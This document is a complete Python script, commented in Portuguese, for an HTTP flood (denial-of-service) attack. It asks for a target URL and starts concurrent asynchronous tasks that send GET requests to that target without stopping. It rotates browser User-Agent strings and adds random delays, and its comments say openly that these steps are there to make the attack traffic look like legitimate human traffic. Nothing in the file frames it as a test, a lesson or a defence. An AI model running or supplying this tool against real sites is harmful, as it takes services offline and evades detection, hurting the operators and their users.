import asyncio
import aiohttp
import random
import logging
from multiprocessing import cpu_count

# Configuração de logging para feedback detalhado
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Lista de User Agents para parecer tráfego legítimo
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

# Função para gerar cabeçalhos HTTP aleatórios
def generate_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }

# Função assíncrona para enviar requisições HTTP
async def send_request(session, url, attack_id, cancel_event):
    try:
        headers = generate_headers()
        while not cancel_event.is_set():
            async with session.get(url, headers=headers) as response:
                status = response.status
                logging.info(f"Ataque {attack_id}: {url} -> Status {status}")
                await asyncio.sleep(random.uniform(0.1, 0.5))  # Intervalo aleatório para parecer tráfego humano
    except Exception as e:
        logging.error(f"Ataque {attack_id} falhou para {url} - Erro: {e}")

# Função principal para coordenar o envio das requisições
async def start_attack(url):
    logging.info("[*] Iniciando ataque HTTP Flood...")

    cancel_event = asyncio.Event()
    num_threads = cpu_count() * 2  # Dobra o número de threads baseado nos núcleos da CPU
    tasks = []

    async with aiohttp.ClientSession() as session:
        for i in range(num_threads):
            task = asyncio.create_task(send_request(session, url, i + 1, cancel_event))
            tasks.append(task)

        try:
            while True:
                await asyncio.sleep(5)  # Aguarda enquanto as requisições continuam
        except KeyboardInterrupt:
            logging.info("Ataque interrompido pelo usuário.")
            cancel_event.set()  # Envia o sinal para cancelar as tarefas
        finally:
            await asyncio.gather(*tasks, return_exceptions=True)  # Aguarda todas as tarefas finalizarem
            logging.info("[*] Ataque concluído!")

# Função principal para capturar a URL
def main():
    try:
        url = input("Digite a URL do alvo (ex: http://example.com): ").strip()

        # Iniciar o ataque com a URL fornecida
        asyncio.run(start_attack(url))
        
    except KeyboardInterrupt:
        logging.info("Execução interrompida pelo usuário.")

if __name__ == "__main__":
    main()
